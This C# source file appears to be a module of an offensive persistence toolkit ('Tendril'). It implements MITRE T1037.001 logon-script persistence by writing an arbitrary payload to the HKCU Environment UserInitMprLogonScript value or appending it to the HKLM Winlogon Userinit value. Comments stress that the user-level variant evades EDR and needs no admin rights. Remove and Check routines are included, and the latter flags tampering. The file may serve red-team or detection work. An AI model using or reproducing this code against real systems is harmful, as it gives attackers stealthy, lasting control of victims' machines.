using System;
using System.Collections.Generic;
using Tendril.Core;
using Tendril.Utilities;

namespace Tendril.Modules
{
    /// <summary>
    /// UserInitMprLogonScript Persistence (T1037.001)
    ///
    /// Two variants:
    ///   1. HKCU\Environment\UserInitMprLogonScript - runs a script at user logon.
    ///      No admin required. Rarely monitored by EDR.
    ///   2. HKLM Winlogon\Userinit - appends payload to the Userinit value.
    ///      Admin required. Higher visibility but more reliable.
    ///
    /// The HKCU variant is particularly evasive: the Environment key is not in the
    /// standard autorun enumeration path for most security tools.
    /// </summary>
    public class UserInitMprLogon : ITendril
    {
        public string Name { get { return "UserInitMprLogon"; } }
        public string Description { get { return "Logon script via Environment key or Winlogon Userinit append"; } }
        public string MitreId { get { return "T1037.001"; } }
        public bool RequiresAdmin { get { return false; } }
        public bool IsReconOnly { get { return false; } }

        private const string EnvPath = @"Environment";
        private const string WinlogonPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string payload, variant;
            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name,
                    "Missing required option: /payload:<script_or_command>");

            if (!options.TryGetValue("variant", out variant))
                variant = "environment"; // "environment" or "winlogon"

            if (variant.ToLower() == "winlogon")
            {
                // Append to existing Userinit value (must preserve the original!)
                string current = RegistryUtils.GetRegValue("HKLM", WinlogonPath, "Userinit");
                if (string.IsNullOrEmpty(current))
                    current = @"C:\Windows\system32\userinit.exe,";

                if (!current.EndsWith(","))
                    current += ",";

                string newValue = current + payload;
                bool ok = RegistryUtils.SetRegValue("HKLM", WinlogonPath, "Userinit", newValue);
                if (!ok)
                    return new TendrilResult(ResultStatus.Failed, Name, "Failed to modify Userinit (admin?)");

                return new TendrilResult(ResultStatus.Success, Name,
                    "Winlogon Userinit modified")
                    .WithMeta("Variant", "Winlogon")
                    .WithMeta("OriginalValue", current)
                    .WithMeta("NewValue", newValue);
            }
            else
            {
                // HKCU\Environment\UserInitMprLogonScript - no admin needed
                bool ok = RegistryUtils.SetRegValue("HKCU", EnvPath, "UserInitMprLogonScript", payload);
                if (!ok)
                    return new TendrilResult(ResultStatus.Failed, Name, "Failed to set UserInitMprLogonScript");

                return new TendrilResult(ResultStatus.Success, Name,
                    "UserInitMprLogonScript set")
                    .WithMeta("Variant", "Environment")
                    .WithMeta("Payload", payload)
                    .WithMeta("Key", @"HKCU\Environment\UserInitMprLogonScript");
            }
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string variant;
            if (!options.TryGetValue("variant", out variant))
                variant = "environment";

            if (variant.ToLower() == "winlogon")
            {
                // Restore default Userinit
                string defaultVal = @"C:\Windows\system32\userinit.exe,";
                RegistryUtils.SetRegValue("HKLM", WinlogonPath, "Userinit", defaultVal);
                return new TendrilResult(ResultStatus.Success, Name, "Winlogon Userinit restored to default");
            }
            else
            {
                RegistryUtils.DeleteRegValue("HKCU", EnvPath, "UserInitMprLogonScript");
                return new TendrilResult(ResultStatus.Success, Name, "UserInitMprLogonScript removed");
            }
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();

            // Check HKCU Environment
            string envScript = RegistryUtils.GetRegValue("HKCU", EnvPath, "UserInitMprLogonScript");
            if (!string.IsNullOrEmpty(envScript))
            {
                results.Add(new TendrilResult(ResultStatus.Warning, Name,
                    "UserInitMprLogonScript is set")
                    .WithMeta("Value", envScript)
                    .WithMeta("Key", @"HKCU\Environment"));
            }

            // Check Winlogon Userinit for non-default values
            string userinit = RegistryUtils.GetRegValue("HKLM", WinlogonPath, "Userinit");
            if (!string.IsNullOrEmpty(userinit))
            {
                // Default is "C:\Windows\system32\userinit.exe," - anything extra is suspicious
                string normalized = userinit.Trim().ToLower().Replace(" ", "");
                bool isDefault = normalized == @"c:\windows\system32\userinit.exe," ||
                                 normalized == @"c:\windows\system32\userinit.exe";

                if (!isDefault)
                {
                    results.Add(new TendrilResult(ResultStatus.Warning, Name,
                        "Winlogon Userinit has non-default entries")
                        .WithMeta("Value", userinit)
                        .WithMeta("Key", @"HKLM\" + WinlogonPath));
                }
            }

            return results;
        }
    }
}
